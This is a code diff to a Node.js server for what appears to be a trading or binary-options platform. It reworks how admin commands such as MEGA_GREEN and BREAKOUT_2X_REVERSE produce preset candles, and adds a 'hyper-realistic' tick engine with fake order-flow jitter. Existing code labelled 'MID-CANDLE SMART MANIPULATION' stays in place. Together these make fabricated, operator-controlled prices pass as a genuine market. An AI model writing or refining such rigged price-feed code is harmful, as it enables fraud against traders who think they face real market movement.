@@ -1,4 +1,4 @@
-// --- START: main app server.js (v30.5 - Ultimate Admin Engine & Natural Physics) ---
+// --- START: main app server.js (v31.0 - Hyper-Realistic Fluid Engine & Mega Overrides) ---
 
 const express = require('express');
 const http = require('http');
@@ -125,113 +125,90 @@ function generateDynamicCandle(timestamp, lastCandle, cmdObj) {
     }
 
     const open = lastCandle.close;
+    // Standard volatility
     const baseVol = open * (0.00008 + Math.random() * 0.0001);
     
-    // --- 1. Mega Candle Logic (4 to 6 times bigger) ---
-    if (command === 'MEGA_GREEN' || command === 'MEGA_RED') {
-        const isGreen = command === 'MEGA_GREEN';
-        const bodySize = baseVol * (4 + Math.random() * 2); // 4x to 6x
-        const upperWick = baseVol * 0.2;
-        const lowerWick = baseVol * 0.2;
-        const close = isGreen ? open + bodySize : open - bodySize;
-        const high = Math.max(open, close) + upperWick;
-        const low = Math.min(open, close) - lowerWick;
-        return {
-            timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
-            isPredetermined: true, isNatural: false, 
-            targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
-            pattern: 'NORMAL', speed, animationStyle: 'smooth', isAdminCommand: true
-        };
-    }
+    let bodySize = baseVol;
+    let upperWick = baseVol * 0.5, lowerWick = baseVol * 0.5;
+    let targetColor = 'GREEN';
+    let animationStyle = 'normal'; 
     
+    // --- 1. Mega Candle Logic (Massive size, 15 to 25 pips absolute equivalent) ---
+    if (command === 'MEGA_GREEN' || command === 'MEGA_RED') {
+        // Enforce a massive jump compared to normal volatility
+        bodySize = open * (0.0015 + Math.random() * 0.0010); 
+        targetColor = command === 'MEGA_GREEN' ? 'GREEN' : 'RED';
+        animationStyle = 'spike_first'; // Surges violently
+    }
     // --- 2. 2x Breakout Reverse Logic ---
-    if (command === 'BREAKOUT_2X_REVERSE') {
-        const prevBody = Math.abs(lastCandle.close - lastCandle.open) || baseVol;
-        const bodySize = prevBody * 2.5; // Double the previous body size
-        const isGreen = (lastCandle.close <= lastCandle.open); // Color is exactly opposite of last candle
-        
-        let upperWick = baseVol * (0.5 + Math.random());
-        let lowerWick = baseVol * (0.5 + Math.random());
-        
-        // Apply wick override if set
-        if (wickType === 'none') { upperWick = 0; lowerWick = 0; }
-        else if (wickType === 'long') { upperWick *= 3; lowerWick *= 3; }
-
-        const close = isGreen ? open + bodySize : open - bodySize;
-        const high = Math.max(open, close) + upperWick;
-        const low = Math.min(open, close) - lowerWick;
-        return {
-            timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
-            isPredetermined: true, isNatural: false, 
-            targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
-            pattern: 'NORMAL', speed, animationStyle: 'spike_first', isAdminCommand: true
-        };
+    else if (command === 'BREAKOUT_2X_REVERSE') {
+        const prevBody = Math.abs(lastCandle.close - lastCandle.open);
+        // Ensure it's at least double, but also enforce a minimum size so it doesn't fail on a doji
+        bodySize = Math.max(prevBody * 2.5, open * 0.0005); 
+        targetColor = (lastCandle.close >= lastCandle.open) ? 'RED' : 'GREEN'; // Exact reverse of last candle
+        animationStyle = 'dip_first'; // Fakes one way, then breaks out hard
     }
-
     // --- 3. Random Natural Logic ---
-    if (command === 'GREEN_RANDOM') {
-        const greenPatterns = ['GREEN', 'BULLISH_MARUBOZU', 'GREEN_HAMMER', 'GREEN_SHOOTING_STAR', 'GREEN_SPINNING_TOP'];
-        command = greenPatterns[Math.floor(Math.random() * greenPatterns.length)];
-    } else if (command === 'RED_RANDOM') {
-        const redPatterns = ['RED', 'BEARISH_MARUBOZU', 'RED_HAMMER', 'RED_SHOOTING_STAR', 'RED_SPINNING_TOP'];
-        command = redPatterns[Math.floor(Math.random() * redPatterns.length)];
+    else if (command === 'GREEN_RANDOM' || command === 'RED_RANDOM') {
+        targetColor = command.includes('GREEN') ? 'GREEN' : 'RED';
+        bodySize = baseVol * (1.2 + Math.random() * 2.5); // Natural random fat/normal bodies
+        
+        const randStyle = Math.random();
+        if (targetColor === 'GREEN') {
+            if (randStyle < 0.4) animationStyle = 'dip_first'; // Dips deep red, then shoots green
+            else if (randStyle < 0.8) animationStyle = 'spike_first'; // Huge green, then leaves upper wick
+        } else {
+            if (randStyle < 0.4) animationStyle = 'spike_first'; // Spikes green, then crashes red
+            else if (randStyle < 0.8) animationStyle = 'dip_first'; // Crashes deep red, then recovers slightly
+        }
     }
-
     // --- 4. Classic Patterns ---
-    let bodySize, upperWick, lowerWick, close, high, low;
-
-    switch (command) {
-        case 'GREEN': 
-            bodySize = baseVol; close = open + bodySize; upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5; break;
-        case 'RED': 
-            bodySize = baseVol; close = open - bodySize; upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5; break;
-        case 'BULLISH_MARUBOZU': 
-            bodySize = baseVol * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
-        case 'BEARISH_MARUBOZU': 
-            bodySize = baseVol * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
-        case 'GREEN_HAMMER': 
-            bodySize = baseVol * 0.3; close = open + bodySize; upperWick = 0; lowerWick = baseVol * 2.5; break;
-        case 'RED_HAMMER': 
-            bodySize = baseVol * 0.3; close = open - bodySize; upperWick = 0; lowerWick = baseVol * 2.5; break;
-        case 'GREEN_SHOOTING_STAR': 
-            bodySize = baseVol * 0.3; close = open + bodySize; upperWick = baseVol * 2.5; lowerWick = 0; break;
-        case 'RED_SHOOTING_STAR': 
-            bodySize = baseVol * 0.3; close = open - bodySize; upperWick = baseVol * 2.5; lowerWick = 0; break;
-        case 'DOJI': 
-            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = baseVol; lowerWick = baseVol; break;
-        case 'LONG_LEGGED_DOJI': 
-            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = baseVol * 3; lowerWick = baseVol * 3; break;
-        case 'DRAGONFLY_DOJI': 
-            bodySize = open * 0.000002; close = open + bodySize; upperWick = 0; lowerWick = baseVol * 2.5; break;
-        case 'GRAVESTONE_DOJI': 
-            bodySize = open * 0.000002; close = open - bodySize; upperWick = baseVol * 2.5; lowerWick = 0; break;
-        case 'GREEN_SPINNING_TOP': 
-            bodySize = baseVol * 0.4; close = open + bodySize; upperWick = baseVol * 1.5; lowerWick = baseVol * 1.5; break;
-        case 'RED_SPINNING_TOP': 
-            bodySize = baseVol * 0.4; close = open - bodySize; upperWick = baseVol * 1.5; lowerWick = baseVol * 1.5; break;
-        case 'HUGE_PUMP': 
-            bodySize = baseVol * 5; close = open + bodySize; upperWick = baseVol * 0.2; lowerWick = baseVol * 0.2; break;
-        case 'HUGE_DUMP': 
-            bodySize = baseVol * 5; close = open - bodySize; upperWick = baseVol * 0.2; lowerWick = baseVol * 0.2; break;
-        default: 
-            bodySize = baseVol; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = baseVol * 0.5; lowerWick = baseVol * 0.5;
+    else {
+        switch (command) {
+            case 'GREEN': 
+                bodySize = baseVol; targetColor = 'GREEN'; break;
+            case 'RED': 
+                bodySize = baseVol; targetColor = 'RED'; break;
+            case 'BULLISH_MARUBOZU': 
+                bodySize = baseVol * 3; targetColor = 'GREEN'; wickType = 'none'; break;
+            case 'BEARISH_MARUBOZU': 
+                bodySize = baseVol * 3; targetColor = 'RED'; wickType = 'none'; break;
+            case 'GREEN_HAMMER': 
+                bodySize = baseVol * 0.3; targetColor = 'GREEN'; upperWick = 0; lowerWick = baseVol * 2.5; break;
+            case 'RED_HAMMER': 
+                bodySize = baseVol * 0.3; targetColor = 'RED'; upperWick = 0; lowerWick = baseVol * 2.5; break;
+            case 'GREEN_SHOOTING_STAR': 
+                bodySize = baseVol * 0.3; targetColor = 'GREEN'; upperWick = baseVol * 2.5; lowerWick = 0; break;
+            case 'RED_SHOOTING_STAR': 
+                bodySize = baseVol * 0.3; targetColor = 'RED'; upperWick = baseVol * 2.5; lowerWick = 0; break;
+            case 'DOJI': 
+                bodySize = open * 0.000002; targetColor = Math.random() > 0.5 ? 'GREEN' : 'RED'; upperWick = baseVol; lowerWick = baseVol; break;
+            default: 
+                bodySize = baseVol; targetColor = command.includes('RED') ? 'RED' : 'GREEN';
+        }
     }
 
-    // Apply Wick Overrides
+    // Apply Wick Overrides from Admin
     if (wickType === 'none') {
         upperWick = 0; lowerWick = 0;
     } else if (wickType === 'long') {
-        upperWick *= 3; lowerWick *= 3;
+        upperWick = bodySize * (0.8 + Math.random());
+        lowerWick = bodySize * (0.8 + Math.random());
+    } else {
+        // Natural Random Wicks
+        upperWick = bodySize * (0.1 + Math.random() * 0.8);
+        lowerWick = bodySize * (0.1 + Math.random() * 0.8);
     }
 
-    high = Math.max(open, close) + upperWick;
-    low = Math.min(open, close) - lowerWick;
+    const close = targetColor === 'GREEN' ? open + bodySize : open - bodySize;
+    const high = Math.max(open, close) + upperWick;
+    const low = Math.min(open, close) - lowerWick;
 
     return {
         timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
         isPredetermined: true, isNatural: false, 
         targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
-        pattern: command, speed, animationStyle: 'normal', isAdminCommand: true
+        pattern: command, speed, animationStyle, isAdminCommand: true
     };
 }
 
@@ -254,7 +231,7 @@ async function initializeNewMarket(marketId) {
         currentPrice = c.close;
     }
 
-    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
+    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0, lastJitter: 0 };
 }
 
 // 🔥 CORE LOGIC: Controls Candle Output
@@ -404,19 +381,13 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     return lastCandle;
 }
 
-// 🔥 TICK ENGINE: Advanced Natural Animation Math 🔥
+// 🔥 TICK ENGINE: Hyper-Realistic Fluid & Snappy Physics 🔥
 function updateRealisticPrice(marketData, candle, currentPeriod) {
     if (!candle.isPredetermined) return;
 
     const now = Date.now();
     const timeElapsed = Math.max(0, now - currentPeriod);
-    
-    // Admin Speed Control
-    let speedMultiplier = 1.0;
-    if (candle.speed === 'fast') speedMultiplier = 1.5;
-    if (candle.speed === 'slow') speedMultiplier = 0.6;
-    
-    let effProgress = Math.min((timeElapsed * speedMultiplier) / TIMEFRAME, 1.0);
+    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
 
     // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
     // Only runs if AutoPilot generated this candle (Admins are locked)
@@ -466,59 +437,61 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     }
     // -----------------------------------------------------------------------
 
-    let idealPrice = candle.open;
-    const pattern = candle.pattern || 'NORMAL';
+    const isGreen = candle.targetClose > candle.open;
+    const peak = isGreen ? candle.targetHigh : candle.targetLow;
+    const trough = isGreen ? candle.targetLow : candle.targetHigh;
+    
+    let macroPrice = candle.open;
 
-    // Advanced Natural Animation Styles for Mega/Breakout
-    if (candle.animationStyle === 'spike_first') {
-        if (candle.targetClose > candle.open) { 
-            // Pumps super high, then retraces to form an upper wick
-            if (effProgress < 0.5) idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.5);
-            else idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((effProgress - 0.5) / 0.5);
-        } else { 
-            // Dumps super low, then retraces to form a lower wick
-            if (effProgress < 0.5) idealPrice = candle.open - (candle.open - candle.targetLow) * (effProgress / 0.5);
-            else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((effProgress - 0.5) / 0.5);
-        }
-    } 
-    // Classic Pattern Animations
-    else if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
-        if (effProgress < 0.6) {
-            idealPrice = candle.open - (candle.open - candle.targetLow) * (effProgress / 0.6);
-        } else {
-            idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((effProgress - 0.6) / 0.4);
-        }
-    } 
-    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
-        if (effProgress < 0.6) {
-            idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.6);
-        } else {
-            idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((effProgress - 0.6) / 0.4);
-        }
-    }
-    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
-        if (effProgress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.3);
-        else if (effProgress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((effProgress - 0.3) / 0.4);
-        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((effProgress - 0.7) / 0.3);
-    }
-    else {
-        // Smooth natural progression for standard candles
-        const easeProgress = 1 - Math.pow(1 - effProgress, 3);
-        idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
+    // Fluid Natural Macro Path Strategy
+    if (candle.animationStyle === 'dip_first') {
+        if (progress < 0.3) macroPrice = candle.open + (trough - candle.open) * (progress / 0.3);
+        else if (progress < 0.8) macroPrice = trough + (peak - trough) * ((progress - 0.3) / 0.5);
+        else macroPrice = peak + (candle.targetClose - peak) * ((progress - 0.8) / 0.2);
+    } else if (candle.animationStyle === 'spike_first') {
+        if (progress < 0.3) macroPrice = candle.open + (peak - candle.open) * (progress / 0.3);
+        else if (progress < 0.8) macroPrice = peak + (trough - peak) * ((progress - 0.3) / 0.5);
+        else macroPrice = trough + (candle.targetClose - trough) * ((progress - 0.8) / 0.2);
+    } else {
+        // Normal Action (Swings to low, up to high, settles to close)
+        if (progress < 0.2) macroPrice = candle.open + (trough - candle.open) * (progress / 0.2);
+        else if (progress < 0.75) macroPrice = trough + (peak - trough) * ((progress - 0.2) / 0.55);
+        else macroPrice = peak + (candle.targetClose - peak) * ((progress - 0.75) / 0.25);
     }
 
-    const noiseFactor = effProgress < 1.0 ? (1 - Math.pow(effProgress, 2)) : 0; 
-    const volatility = candle.open * 0.00005;
-    const noise = (Math.random() - 0.5) * volatility * noiseFactor;
+    // High-Frequency Market Jitter (The "Water" / Real feel)
+    const totalRange = Math.abs(candle.targetHigh - candle.targetLow) || (candle.open * 0.0001);
+    
+    let noiseFactor = 0.2; // Normal Jitter
+    if (candle.speed === 'fast') noiseFactor = 0.6; // Extremely jumpy
+    if (candle.speed === 'slow') noiseFactor = 0.05; // Very sluggish
 
-    marketData.currentPrice = idealPrice + noise;
-    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
-    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
+    let microNoise = 0;
+    
+    // 30% chance for a sudden jerk (simulates large market orders hitting)
+    if (Math.random() > 0.7) {
+        microNoise = (Math.random() - 0.5) * totalRange * (noiseFactor * 2);
+    } else {
+        // Standard rapid ticking
+        microNoise = (Math.random() - 0.5) * totalRange * noiseFactor;
+    }
+    
+    // Smooth the momentum so it doesn't just teleport wildly
+    if (!marketData.lastJitter) marketData.lastJitter = 0;
+    marketData.lastJitter = (marketData.lastJitter * 0.4) + (microNoise * 0.6);
 
-    if (timeElapsed >= TIMEFRAME - 1500) {
-        marketData.currentPrice = candle.targetClose;
+    let rawPrice = macroPrice + marketData.lastJitter;
+
+    // Smooth convergence at the very end to hit the target perfectly without jitter
+    if (timeElapsed >= TIMEFRAME - 2000) {
+        const closingProgress = (timeElapsed - (TIMEFRAME - 2000)) / 2000;
+        rawPrice = rawPrice + (candle.targetClose - rawPrice) * closingProgress;
     }
 
+    // Clamp strictly within the generated High/Low limits so Wicks are clean
+    marketData.currentPrice = Math.max(candle.targetLow, Math.min(candle.targetHigh, rawPrice));
+
+    // Update real-time candle bounds
     candle.close = roundPrice(marketData.currentPrice);
     candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
     candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
@@ -1064,6 +1037,6 @@ setInterval(async () => {
     }
 }, 2000);
 
-app.get('/ping', (_req, res) => res.send('Server V30.5 - Advanced Admin Engine'));
+app.get('/ping', (_req, res) => res.send('Server V31.0 - Hyper Realistic Fluid Engine Active'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
